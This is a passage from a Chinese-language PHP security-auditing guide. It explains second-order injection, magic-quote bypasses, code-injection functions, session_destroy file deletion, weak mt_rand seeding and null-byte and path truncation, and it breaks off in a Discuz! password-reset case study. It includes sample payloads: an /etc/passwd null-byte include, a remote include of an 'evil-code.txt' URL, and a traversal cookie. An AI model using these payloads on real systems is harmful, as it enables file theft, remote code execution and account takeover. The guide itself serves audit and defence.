<h4><a id="user-content-二次攻击" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#二次攻击" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content--9"></a>二次攻击</h4>



<p>_详细见附录`[`1`]`_
</p>





<p></p><ul><li>1)数据库出来的变量没有进行过滤*</li><li>2)数据库的转义符号：*</li></ul>
<pre></pre>
<p></p>
<p>从这里我们可以思考得到一个结论：一切进入函数的变量都是有害的，另外利用二次攻击我们可以实现一个webrootkit，把我们的恶意构造直接放到数据库里。我们应当把这样的代码看成一个vul？
</p>
<p>|| *漏洞审计策略* ||
|| PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 ||
</p>

<h4><a id="user-content-魔术引号带来的新的安全问题" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#魔术引号带来的新的安全问题" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content--10"></a>魔术引号带来的新的安全问题</h4>



<p>首先我们看下魔术引号的处理机制：
</p>


<p>这给我们引进了一个非常有用的符号“\”，“\”符号不仅仅是转义符号，在WIN系统下也是目录转跳的符号。这个特点可能导致php应用程序里产生非常有意思的漏洞：
</p>








<p></p><ul><li>1)得到原字符（',\,",null]）*</li><li>2)得到“\”字符*</li></ul>
<pre></pre>
<p></p>
<p>提交内容：
</p>


<p>执行的SQL语句为：
</p>


<p>|| *漏洞审计策略* ||
|| PHP版本要求：无<br>系统要求：无<br>审计策略：查找字符串处理函数如substr或者通读代码 ||
</p>

<h4><a id="user-content-变量key与魔术引号" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#变量key与魔术引号" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content-key-2"></a>变量key与魔术引号</h4>



<p>我们最在这一节的开头就提到了变量key，PHP的魔术引号对它有什么影响呢？
</p>






<p></p><ul><li>1)当magic_quotes_gpc = On时，在php5.24下测试显示：*</li></ul>
从上面结果可以看出来，在设置了magic_quotes_gpc = On下，变量key受魔术引号影响。但是在php4和php&lt;5.2.1的版本中，不处理数组第一维变量的key，测试代码如下：
<p></p>


<p>结果显示:
</p>


<p>数组第一维变量的key不受魔术引号的影响。
</p>
<p>|| *漏洞审计策略* ||
|| PHP版本要求：php4和php&lt;5.2.1<br>系统要求：无<br>审计策略：通读代码 ||
</p>





<p></p><ul><li>2)当magic_quotes_gpc = Off时，在php5.24下测试显示：*</li></ul>
对于magic_quotes_gpc = Off时所有的变量都是不安全的，考虑到这个，很多程序都通过addslashes等函数来实现魔术引号对变量的过滤，示例代码如下：
<p></p>


<p>以上的代码看上去很完美，但是他这个代码里addslashes($value)只处理了变量的具体的值，但是没有处理变量本身的key，上面的代码显示结果如下：
</p>


<p>|| *漏洞审计策略* ||
|| PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 ||
</p>

<h3><a id="user-content-代码注射" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#代码注射" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content--11"></a>代码注射</h3>




<h4><a id="user-content-php中可能导致代码注射的函数" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#php中可能导致代码注射的函数" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content-PHP-3"></a>PHP中可能导致代码注射的函数</h4>



<p>很多人都知道eval、preg_replace+/e可以执行代码，但是不知道php还有很多的函数可以执行代码如：
</p>
<p>|| assert() ||
|| call_user_func() ||
|| call_user_func_array() ||
|| create_function() ||
|| 变量函数 ||
|| ... ||
</p>
<p>这里我们看看最近出现的几个关于create_function()代码执行漏洞的代码：
</p>


<p>|| *漏洞审计策略* ||
|| PHP版本要求：无<br>系统要求：无<br>审计策略：查找对应函数（assert,call_user_func,call_user_func_array,create_function等） ||
</p>

<h4><a id="user-content-变量函数与双引号" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#变量函数与双引号" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content--12"></a>变量函数与双引号</h4>



<p></p><pre></pre>
<p></p>
<p>对于单引号和双引号的区别，很多程序员深有体会，示例代码：
</p>


<p>我们再看如下代码：
</p>

                        
<p>另外很多的应用程序都把变量用""存放在缓存文件或者config或者data文件里，这样很容易被人注射变量函数。
</p>
<p></p><pre></pre>
<p></p>
<p>|| *漏洞审计策略* ||
|| PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 ||
</p>

<h3><a id="user-content-php自身函数漏洞及缺陷" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#php自身函数漏洞及缺陷" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content-PHP-4"></a>PHP自身函数漏洞及缺陷</h3>



<p></p><pre></pre>
<p></p>

<h4><a id="user-content-php函数的溢出漏洞" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#php函数的溢出漏洞" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content-PHP-5"></a>PHP函数的溢出漏洞</h4>



<p>大家还记得Stefan Esser大牛的Month of PHP Bugs（MOPB见附录[2]）项目么，其中比较有名的要算是unserialize()，代码如下：
</p>


<p>在以往的PHP版本里，很多函数都曾经出现过溢出漏洞，所以我们在审计应用程序漏洞的时候不要忘记了测试目标使用的PHP版本信息。
</p>
<p>|| *漏洞审计策略* ||
|| PHP版本要求：对应fix的版本<br>系统要求：<br>审计策略：查找对应函数名 ||
</p>

<h4><a id="user-content-php函数的其他漏洞" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#php函数的其他漏洞" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content-PHP-6"></a>PHP函数的其他漏洞</h4>



<p>Stefan Esser大牛发现的漏洞：unset()--Zend_Hash_Del_Key_Or_Index Vulnerability
</p>
<p></p><pre></pre>
<p></p>
<p>比如phpwind早期的serarch.php里的代码：
</p>


<p></p><pre></pre>
<p></p>
<p>|| *漏洞审计策略* ||
|| PHP版本要求：php4&lt;4.3 php5&lt;5.14<br>系统要求：无<br>审计策略：查找unset ||
</p>

<h4><a id="user-content-session_destroy删除文件漏洞" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#session_destroy删除文件漏洞" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content-session_destroy"></a>session_destroy()删除文件漏洞</h4>



<p>_测试PHP版本：5.1.2_
</p>
<p></p><pre></pre>
<p></p>
<p>这个漏洞是几年前朋友saiy发现的，session_destroy()函数的功能是删除session文件，很多web应用程序的logout的功能都直接调用这个函数删除session，但是这个函数在一些老的版本中缺少过滤导致可以删除任意文件。测试代码如下：
</p>


<p>当我们提交构造cookie:PHPSESSID=/../1.php，相当于unlink('sess`_`/../1.php')这样就通过注射../转跳目录删除任意文件了。很多著名的程序某些版本都受影响如phpmyadmin，sablog，phpwind3等等。
</p>
<p>|| *漏洞审计策略* ||
|| PHP版本要求：具体不详<br>系统要求：无<br>审计策略：查找session_destroy ||
</p>

<h4><a id="user-content-随机函数" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#随机函数" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content--13"></a>随机函数</h4>



<p></p><pre></pre>
<p></p>




<p></p><ul><li>1) rand() VS mt_rand()*</li></ul>
可以看出rand()最大的随机数是32767，这个很容易被我们暴力破解。 
<p></p>


<p>当我们的程序使用rand处理session时，攻击者很容易暴力破解出你的session，但是对于mt_rand是很难单纯的暴力的。
</p>
<p>|| *漏洞审计策略* ||
|| PHP版本要求：无<br>系统要求：无<br>审计策略：查找rand ||
</p>


<p></p><ul><li>2) mt_srand()/srand()-weak seeding（by Stefan Esser）*</li></ul>
看php手册里的描述：
<p></p>


<p>用 seed 来给随机数发生器播种。从 PHP 4.2.0 版开始，seed 参数变为可选项，当该项为空时，会被设为随时数。 
</p>
<p>例子 1. mt_srand() 范例
</p>


<p></p><pre></pre>
<p></p>
<p>_注: 自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，现已自动完成。_
</p>
<p>php从4.2.0开始实现了自动播种，但是为了兼容，后来使用类似于这样的代码播种：
</p>


<p>但是使用(double)microtime()`*`1000000类似的代码seed是比较脆弱的：
</p>


<p>那么很容易暴力破解,测试代码如下：
</p>


<p>从上面的代码实现了对seed的破解，另外根据Stefan Esser的分析seed还根据进程变化而变化，换句话来说同一个进程里的seed是相同的。 然后同一个seed每次mt_rand的值都是特定的。如下图：
</p>
<p>|| *seed-A* ||
|| mt_rand-A-1<br>mt_rand-A-2<br>mt_rand-A-3 ||
</p>
<p>|| *seed-B* ||
|| mt_rand-B-1<br>mt_rand-B-2<br>mt_rand-B-3 ||
</p>
<p>对于seed-A里mt_rand-1/2/3都是不相等的，但是值都是特定的，也就是说当seed-A等于seed-B，那么mt_rand-A-1就等于mt_rand-B-1…，这样我们只要能够得到seed就可以得到每次mt_rand的值了。
</p>
<p>对于5.2.6&gt;php&gt;4.2.0直接使用默认播种的程序也是不安全的（很多的安全人员错误的以为这样就是安全的），这个要分两种情况来分析：
</p>
<p>第一种：'Cross Application Attacks'，这个思路在Stefan Esser文章里有提到，主要是利用其他程序定义的播种（如mt_srand ((double) microtime()`*` 1000000)），phpbb+wordpree组合就存在这样的危险.
</p>
<p>第二种：5.2.6&gt;php&gt;4.2.0默认播种的算法也不是很强悍，这是Stefan Esser的文章里的描述：
</p>

<p></p><pre>    The Implementation&lt;br&gt;When mt_rand() is seeded internally or by a call to mt_srand() PHP 4 and PHP 5 &lt;= 5.2.0 force the lowest bit to 1. Therefore the strength of the seed is only 31 and not 32 bits. In PHP 5.2.1 and above the implementation of the Mersenne Twister was changed and the forced bit removed.
</pre>
<p></p>

<p>在32位系统上默认的播种的种子为最大值是`2^32`，这样我们循环最多`2^32`次就可以破解seed。而在PHP 4和PHP 5 &lt;= 5.2.0 的算法有个bug：奇数和偶数的播种是一样的（详见附录[3]）,测试代码如下：
</p>


<p>通过上面的代码发现$a==$b，所以我们循环的次数为2^32/2=2^31次。我们看如下代码：
</p>


<p>运行结果如下：
</p>


<p>当10634次时候我们得到了结果。
</p>
<p>当PHP版本到了5.2.1后，通过修改算法修补了奇数和偶数的播种相等的问题，这样也导致了php5.2.0前后导致同一个播种后的mt_rand()的值不一样。比如：
</p>


<p>正是这个原因，也要求了我们的exp的运行环境：当目标&gt;5.20时候，我们exp运行的环境也要是&gt;5.20的版本，反过来也是一样。
</p>
<p>从上面的测试及分析来看，php&lt;5.26不管有没有定义播种，mt_rand处理的数据都是不安全的。在web应用里很多都使用mt_rand来处理随机的session，比如密码找回功能等等，这样的后果就是被攻击者恶意利用直接修改密码。
</p>
<p>很多著名的程序都产生了类似的漏洞如wordpress、phpbb、punbb等等。（在后面我们将实际分析下国内著名的bbs程序Discuz!的mt_srand导致的漏洞）
</p>
<p>|| *漏洞审计策略* ||
|| PHP版本要求：php4 php5&lt;5.2.6<br>系统要求：无<br>审计策略：查找mt_srand/mt_rand ||
</p>


<h3><a id="user-content-特殊字符" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#特殊字符" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content--14"></a>特殊字符</h3>



<p>其实“特殊字符”也没有特定的标准定义，主要是在一些code hacking发挥着特殊重作用的一类字符。下面就举几个例子：
</p>
<p></p><pre></pre>
<p></p>

<h4><a id="user-content-截断" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#截断" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content--15"></a>截断</h4>



<p>其中最有名的数大家都熟悉的null字符截断。
</p>

<h5><a id="user-content-include截断" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#include截断" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content-include"></a>include截断</h5>





<p>提交“action=/etc/passwd%00”中的“%00”将截断后面的“.php”，但是除了“%00”还有没有其他的字符可以实现截断使用呢？肯定有人想到了远程包含的url里问号“?”的作用，通过提交“action=`<a href="http://www.hacksite.com/evil-code.txt%60?%E2%80%9D%E8%BF%99%E9%87%8C%E2%80%9C?%E2%80%9D%E5%AE%9E%E7%8E%B0%E4%BA%86%E2%80%9C%E4%BC%AA%E6%88%AA%E6%96%AD%E2%80%9D%EF%BC%9A%EF%BC%89%EF%BC%8C%E5%A5%BD%E8%B1%A1%E8%BF%99%E4%B8%AA%E7%9C%8B%E4%B8%8A%E5%8E%BB%E4%B8%8D%E6%98%AF%E9%82%A3%E4%B9%88%E8%88%92%E6%9C%8D%E9%82%A3%E4%B9%88%E6%88%91%E4%BB%AC%E7%AE%80%E5%8D%95%E5%86%99%E4%B8%AA%E4%BB%A3%E7%A0%81fuzz%E4%B8%80%E4%B8%8B%EF%BC%9A">http://www.hacksite.com/evil-code.txt`?”这里“?”实现了“伪截断”：），好象这个看上去不是那么舒服那么我们简单写个代码fuzz一下：</a>
</p>


<p>经过测试字符“.”、“ /”或者2个字符的组合，在一定的长度时将被截断，win系统和`*`nix的系统长度不一样，当win下strlen(realpath("./"))+strlen($`_`GET`['action']`)的长度大于256时被截断，对于`*`nix的长度是4 `*` 1024 = 4096。对于php.ini里设置远程文件关闭的时候就可以利用上面的技巧包含本地文件了。（此漏洞由cloie#ph4nt0m.org最先发现]）
</p>

<h5><a id="user-content-数据截断" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#数据截断" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content--16"></a>数据截断</h5>



<p>对于很多web应用文件在很多功能是不容许重复数据的，比如用户注册功能等。一般的应用程序对于提交注册的username和数据库里已有的username对比是不是已经有重复数据，然而我们可以通过“数据截断”等来饶过这些判断，数据库在处理时候产生截断导致插入重复数据。
</p>


<p></p><ul><li>1) Mysql SQL Column Truncation Vulnerabilities*</li></ul>
这个漏洞又是大牛Stefan Esser发现的（Stefan Esser是我的偶像:)），这个是由于mysql的sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示warning，而不是error（如果是error就插入不成功），这样可能会导致一些截断问题。测试如下：
<p></p>
<p></p><pre></pre>
<p></p>




<p></p><ul><li>2) Mysql charset Truncation vulnerability*</li></ul>
这个漏洞是80sec发现的，当mysql进行数据存储处理utf8等数据时对某些字符导致数据截断。测试如下：
<p></p>
<p></p><pre></pre>
<p></p>


<p></p><pre></pre>
<p></p>
<p>很多的web应用程序没有考虑到这些问题，只是在数据存储前简单查询数据是否包含相同数据，如下代码：
</p>


<p>|| *漏洞审计策略* ||
|| PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 ||
</p>

<h5><a id="user-content-文件操作里的特殊字符" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#文件操作里的特殊字符" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content--17"></a>文件操作里的特殊字符</h5>



<p></p><pre></pre>
<p></p>
<p>文件操作里有很多特殊的字符，发挥特别的作用，很多web应用程序没有注意处理这些字符而导致安全问题。比如很多人都知道的windows系统文件名对“空格”和“.”等的忽视，这个主要体现在上传文件或者写文件上，导致直接写webshell。另外对于windows系统对“.\..\”进行系统转跳等等。
</p>
<p></p><pre></pre>
<p></p>
<p>下面还给大家介绍一个非常有意思的问题：
</p>


<p></p><pre></pre>
<p></p>
<p>很多人看出来了上面的代码的问题，程序首先禁止使用“.php”后缀。但是下面居然接了个str_replace替换$webdb[www_url]为空，那么我们提交“.p$webdb[www_url]hp”就可以饶过了。那么上面的代码杂fix呢？有人给出了如下代码：
</p>


<p>str_replace提到前面了，很完美的解决了str_replace代码的安全问题，但是问题不是那么简单，上面的代码在某些系统上一样可以突破。接下来我们先看看下面的代码：
</p>


<p>我们在windows系统运行上面的代码得到如下字符`*` &lt; &gt; ? P p都可以打开目录下的1.php。
</p>
<p>|| *漏洞审计策略* ||
|| PHP版本要求：无<br>系统要求：无<br>审计策略：文读取件操作函数 ||
</p>


<h2><a id="user-content-怎么进一步寻找新的字典" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#怎么进一步寻找新的字典" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content--18"></a>怎么进一步寻找新的字典</h2>



<p>上面我们列举很多的字典，但是很多都是已经公开过的漏洞或者方式，那么我们怎么进一步找到新的字典或者利用方式呢？
</p>

<p></p><pre></pre>
<p></p>


<h2><a id="user-content-demo" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#demo" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content-DEMO"></a>DEMO</h2>



<p>|| *DEMO -- Discuz! Reset User Password 0day Vulnerability 分析<br>（Exp:<a href="http://www.80vul.com/dzvul/sodb/14/sodb-2008-14.txt">http://www.80vul.com/dzvul/sodb/14/sodb-2008-14.txt</a>）* ||
|| PHP版本要求:php4 php5&lt;5.2.6<br>系统要求: 无<br>审计策略:查找mt_srand/mt_rand ||
</p>
<p>第一步 安装Discuz! 6.1后利用grep查找mt_srand得到：
</p>


<p>有两个文件用到了mt_srand()，第1是在./include/global.func.php的随机函数random()里：
</p>


<p>判断了版本，如果是PHP_VERSION &gt; '4.2.0'使用php本身默认的播种。从上一章里的分析我们可以看得出来，使用php本身默认的播种的分程序两种情况：
</p>
